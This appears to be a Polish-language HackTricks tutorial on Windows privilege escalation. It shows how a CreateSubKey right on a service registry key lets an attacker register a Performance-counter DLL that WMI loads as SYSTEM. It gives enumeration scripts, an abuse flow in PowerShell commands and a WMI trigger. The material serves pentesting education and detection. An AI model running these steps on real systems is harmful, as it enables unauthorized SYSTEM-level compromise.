# AppendData/AddSubdirectory Permission over Service Registry

{{#include ../../banners/hacktricks-training.md}}

**Oryginalny post to** [**https://itm4n.github.io/windows-registry-rpceptmapper-eop/**](https://itm4n.github.io/windows-registry-rpceptmapper-eop/)

## Podsumowanie

Jeśli masz tylko **`Create Subkey`** / **`AppendData/AddSubdirectory`** na kluczu rejestru usługi, to nadal jest to dobry trop do privesc. Zwykle **nie możesz** bezpośrednio nadpisać `ImagePath`, `ServiceDll` ani innych istniejących wartości, ale nadal możesz utworzyć podrzędny klucz **`Performance`** pod:

- **`HKLM\SYSTEM\CurrentControlSet\Services\RpcEptMapper`**
- **`HKLM\SYSTEM\CurrentControlSet\Services\Dnscache`**
- Każdym innym kluczem **`HKLM\SYSTEM\CurrentControlSet\Services\<service>`**, gdzie twój token ma **`KEY_CREATE_SUB_KEY`**

Sztuczka polega na tym, że Windows nadal obsługuje starszy model rejestracji **PerfLib V1**. Jeśli usługa ma podklucz **`Performance`**, Windows może załadować stamtąd DLL, gdy konsument liczników wydajności zażąda danych.

Zgodnie z dokumentacją Microsoft, minimalna rejestracja to:
```text
HKLM\SYSTEM\CurrentControlSet\Services\<service>\Performance
Library = C:\Path\payload.dll
Open    = OpenPerfData
Collect = CollectPerfData
Close   = ClosePerfData
```
Zatem wniosek ofensywny jest taki: **nie odrzucaj znaleziska w service registry tylko dlatego, że masz jedynie `CreateSubKey`, a nie `SetValue`**.

## Dlaczego to wystarcza do code execution

Podklucz `Performance` zwykle **nie istnieje domyślnie** w tych usługach, więc potrzebnym primitive jest **`KEY_CREATE_SUB_KEY`**. Gdy klucz istnieje i zawiera `Library`/`Open`/`Collect`/`Close`, każdy **performance counter consumer** może wyzwolić załadowanie DLL.

Kilka ważnych szczegółów:

- Wartość **`Library`** może wskazywać na **pełną ścieżkę do DLL**.
- DLL musi eksportować **`OpenPerfData`**, **`CollectPerfData`** i **`ClosePerfData`** oraz zwracać `ERROR_SUCCESS`.
- Kod uruchamia się w **kontekście consumera**, **niekoniecznie w samym podatnym procesie usługi**.
- W klasycznym przypadku `RpcEptMapper` / `Dnscache`, **WMI performance query** może spowodować, że **`wmiprvse.exe`** załaduje DLL jako **`NT AUTHORITY\SYSTEM`**.

Dlatego ten primitive łatwo przeoczyć podczas triage: nadrzędny klucz usługi nie jest „w pełni writable”, ale nadal można go wykorzystać ofensywnie.

## Szybka enumeracja

Ręczny spot-check z **AccessChk**:
```bash
accesschk.exe -k -w hklm\system\currentcontrolset\services\rpceptmapper
accesschk.exe -k -w hklm\system\currentcontrolset\services\dnscache
```
Przykład PowerShell do wyszukiwania nisko uprzywilejowanych principalów z **`CreateSubKey`** na kluczach service:
```powershell
Get-ChildItem HKLM:\SYSTEM\CurrentControlSet\Services | ForEach-Object {
$weak = (Get-Acl $_.PSPath).Access | Where-Object {
$_.AccessControlType -eq 'Allow' -and
($_.RegistryRights -band [System.Security.AccessControl.RegistryRights]::CreateSubKey) -eq [System.Security.AccessControl.RegistryRights]::CreateSubKey -and
$_.IdentityReference -match 'Users|Authenticated Users|INTERACTIVE|Network Configuration Operators'
}
if ($weak) {
[pscustomobject]@{Service=$_.PSChildName; Principals=($weak.IdentityReference -join ', '); Rights=($weak.RegistryRights -join '; ')}
}
}
```
Przydatne narzędzia:

- **PrivescCheck**: `Get-ModifiableRegistryPath` zostało stworzone specjalnie do wykrywania tej klasy problemu.
- **SharpUp**: `SharpUp.exe audit ModifiableServiceRegistryKeys`
- **Perfusion**: automatyzuje zrzut DLL, rejestrację `Performance`, wyzwalacz WMI, duplikację tokenów i czyszczenie na starszych podatnych celach (na przykład: `Perfusion.exe -c cmd -i -k Dnscache`).

## Abuse flow

Utwórz podklucz `Performance` i wypełnij wymagane wartości:
```powershell
$svc = 'RpcEptMapper' # or Dnscache / NetBT / another vulnerable service
$k = "HKLM:\SYSTEM\CurrentControlSet\Services\$svc\Performance"
New-Item $k -Force | Out-Null
New-ItemProperty $k -Name Library -Value "$pwd\payload.dll" -PropertyType String -Force | Out-Null
New-ItemProperty $k -Name Open -Value 'OpenPerfData' -PropertyType String -Force | Out-Null
New-ItemProperty $k -Name Collect -Value 'CollectPerfData' -PropertyType String -Force | Out-Null
New-ItemProperty $k -Name Close -Value 'ClosePerfData' -PropertyType String -Force | Out-Null
```
Następnie wyzwól **uprzywilejowany** consumer performance. Klasycznym przykładem jest zapytanie WMI do klas `Win32_Perf*`:
```powershell
powershell.exe -NoProfile -Command "Get-WmiObject -List | Where-Object { $_.Name -like 'Win32_Perf*' } | Out-Null"
```
Uwagi operacyjne:

- Uruchomienie **`perfmon.exe`** jest przydatne do sprawdzenia, czy rejestracja licznika jest poprawna, ale zwykle ładuje to DLL tylko w **Twoim własnym kontekście użytkownika**.
- Do rzeczywistego LPE uruchom **uprzywilejowanego** konsumenta, takiego jak **WMI**.
- Jeśli piszesz własny exploit, bezpośrednie uruchomienie `cmd.exe` z wnętrza DLL zwykle kończy się powłoką w **session 0**. `Perfusion` rozwiązuje to przez zduplikowanie uprzywilejowanego tokenu do procesu, który został utworzony jako wstrzymany w sesji atakującego.
- Dopasuj architekturę DLL do docelowego konsumenta (**x64 na systemach x64**).

## Uwagi o wersjach / ostatnie zmiany

Historycznie wbudowane słabe klucze to:

- **Windows 7 / Windows Server 2008 R2**: `RpcEptMapper` i `Dnscache`
- **Windows 8 / Windows Server 2012**: `RpcEptMapper`

`Perfusion` zauważa, że aktualizacje z **kwietnia 2021** usunęły łatwą ścieżkę eksploitacji na zaktualizowanych **Windows 8 / Windows Server 2012**, podczas gdy **Windows 7 / Windows Server 2008 R2** nadal były podatne przez **`Dnscache`**.

Ta technika **nie jest tylko historyczna**. W **styczniu 2025** Microsoft załatał powiązany problem AD DS, w którym członkowie **`Network Configuration Operators`** mogli tworzyć podklucze pod **`Dnscache`** i **`NetBT`**, a ten sam pomysł **rejestracji DLL dla performance-counter** mógł zostać ponownie użyty do osiągnięcia **SYSTEM** na wspieranych systemach.

Wniosek dla współczesnych systemów jest więc ogólny: za każdym razem, gdy nisko uprzywilejowany podmiot ma **`CreateSubKey`** na **`HKLM\SYSTEM\CurrentControlSet\Services\<service>`**, sprawdź, czy sam podrzędny klucz **`Performance`** wystarcza, zanim odrzucisz znalezisko.

## Referencje

- [Microsoft Learn - Creating the Application's Performance Key](https://learn.microsoft.com/en-us/windows/win32/perfctrs/creating-the-applications-performance-key)
- [BirkeP - Active Directory Domain Services Elevation of Privilege Vulnerability (CVE-2025-21293)](https://birkep.github.io/posts/Windows-LPE/)
{{#include ../../banners/hacktricks-training.md}}
